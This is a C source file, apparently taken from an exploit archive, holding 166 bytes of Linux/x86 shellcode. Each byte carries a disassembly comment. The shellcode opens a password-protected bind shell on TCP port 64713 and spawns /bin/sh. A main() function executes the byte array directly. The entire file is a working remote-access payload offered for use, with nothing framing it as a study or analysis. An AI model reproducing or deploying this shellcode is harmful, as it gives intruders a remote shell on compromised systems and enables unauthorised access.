/*
 * linux-x86-authportbind.c - AUTH portbind shellcode 166 bytes for Linux/x86
 * Copyright (c) 2006 Gotfault Security <xgc@gotfault.net>
 *
 * portbind shellcode that bind()'s a shell on port 64713/tcp
 * and requests a user password.
 *
 */

char shellcode[] =

  /* socket(AF_INET, SOCK_STREAM, 0) */

  "\x6a\x66"			// push   $0x66
  "\x58"			// pop    %eax
  "\x6a\x01"			// push   $0x1
  "\x5b"			// pop    %ebx
  "\x99"			// cltd
  "\x52"			// push   %edx
  "\x53"			// push   %ebx
  "\x6a\x02"			// push   $0x2
  "\x89\xe1"			// mov    %esp,%ecx
  "\xcd\x80"			// int    $0x80

  /* bind(s, server, sizeof(server)) */

  "\x52"			// push   %edx
  "\x66\x68\xfc\xc9"		// pushw  $0xc9fc  // PORT = 64713
  "\x66\x6a\x02"		// pushw  $0x2
  "\x89\xe1"			// mov    $esp,%ecx
  "\x6a\x10"			// push   $0x10
  "\x51"			// push   %ecx
  "\x50"			// push   %eax
  "\x89\xe1"			// mov    %esp,%ecx
  "\x89\xc6"			// mov    %eax,%esi
  "\x43"			// inc    %ebx
  "\xb0\x66"			// mov    $0x66,%al
  "\xcd\x80"			// int    $0x80

  /* listen(s, anything) */

  "\xb0\x66"			// mov    $0x66,%al
  "\xd1\xe3"			// shl    %ebx
  "\xcd\x80"			// int    $0x80

  /* accept(s, 0, 0) */

  "\x52"			// push   %edx
  "\x52"			// push   %edx
  "\x56"			// push   %esi
  "\x89\xe1"			// mov    %esp,%ecx
  "\x43"			// inc    %ebx
  "\xb0\x66"			// mov    $0x66,%al
  "\xcd\x80"			// int    $0x80

  "\x96"			// xchg   %eax,%esi

  /* send(s, "Password: ", 0x0a, flags) */

  "\x52"			// push   %edx
  "\x68\x72\x64\x3a\x20"	// push   $0x203a6472
  "\x68\x73\x73\x77\x6f"	// push   $0x6f777373
  "\x66\x68\x50\x61"		// pushw  $0x6150
  "\x89\xe7"			// mov    $esp,%edi
  "\x6a\x0a"			// push   $0xa
  "\x57"			// push   %edi
  "\x56"			// push   %esi
  "\x89\xe1"			// mov    %esp,%ecx
  "\xb3\x09"			// mov    $0x9,%bl
  "\xb0\x66"			// mov    $0x66,%al
  "\xcd\x80"			// int    $0x80

  /* recv(s, *buf, 0x08, flags) */

  "\x52"			// push   %edx
  "\x6a\x08"			// push   $0x8
  "\x8d\x4c\x24\x08"		// lea    0x8(%esp),%ecx
  "\x51"			// push   %ecx
  "\x56"			// push   %esi
  "\x89\xe1"			// mov    %esp,%ecx
  "\xb3\x0a"			// mov    $0xa,%bl
  "\xb0\x66"			// mov    $0x66,%al
  "\xcd\x80"			// int    $0x80

  "\x87\xf3"			// xchg   %esi,%ebx

  /* like: strncmp(string1, string2, 0x8) */

  "\x52"                        // push   %edx
  "\x68\x61\x75\x6c\x74"	// push   $0x746c7561 // password
  "\x68\x67\x6f\x74\x66"	// push   $0x66746f67 // here
  "\x89\xe7"			// mov    %esp,%edi
  "\x8d\x74\x24\x1c"		// lea    0x1c(%esp),%esi
  "\x89\xd1"			// mov    %edx,%ecx
  "\x80\xc1\x08"		// add    $0x8,%cl
  "\xfc"			// cld
  "\xf3\xa6"			// repz   cmpsb %es:(%edi),%ds:(%esi)
  "\x74\x04"			// je     dup

  /* exit(something) */

  "\xf7\xf0"			// div    %eax
  "\xcd\x80"			// int    $0x80

  /* dup2(c, 2) , dup2(c, 1) , dup2(c, 0) */

  "\x6a\x02"			// push   $0x2
  "\x59"			// pop    %ecx

  "\xb0\x3f"			// mov    $0x3f,%al
  "\xcd\x80"			// int    $0x80
  "\x49"			// dec    %ecx
  "\x79\xf9"			// jns    dup_loop

  /* execve("/bin/sh", ["/bin/sh"], NULL) */

  "\x6a\x0b"			// push   $0xb
  "\x58"			// pop    %eax
  "\x52"			// push   %edx
  "\x68\x2f\x2f\x73\x68"	// push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e"	// push   $0x6e69622f
  "\x89\xe3"			// mov    %esp, %ebx
  "\x52"			// push   %edx
  "\x53"			// push   %ebx
  "\x89\xe1"			// mov    %esp, %ecx
  "\xcd\x80";			// int    $0x80


int main() {

        int (*f)() = (int(*)())shellcode;
        printf("Length: %u\n", strlen(shellcode));
        f();
}

// milw0rm.com [2006-04-06]